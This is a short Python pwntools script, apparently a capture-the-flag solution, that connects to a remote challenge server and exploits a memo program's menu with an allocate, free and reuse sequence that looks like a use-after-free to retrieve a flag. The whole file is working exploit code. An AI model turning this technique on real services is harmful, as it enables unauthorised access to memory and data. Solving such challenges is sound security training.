from pwn import *

p = remote('152.118.201.241', 3019)

def menu(choice):
    p.sendlineafter(b'Choice: ', str(choice).encode())

def new(idx, data):
    menu(1)
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b': ', data)

def delete(idx):
    menu(3)
    p.sendlineafter(b'Index: ', str(idx).encode())

def print_memo(idx):
    menu(2)
    p.sendlineafter(b'Index: ', str(idx).encode())

def get_flag(idx):
    menu(4)
    p.sendlineafter(b'index? ', str(idx).encode())

# step exploit
new(0, b'AAAA')    
delete(0)          
get_flag(1)        
print_memo(0)      

p.interactive()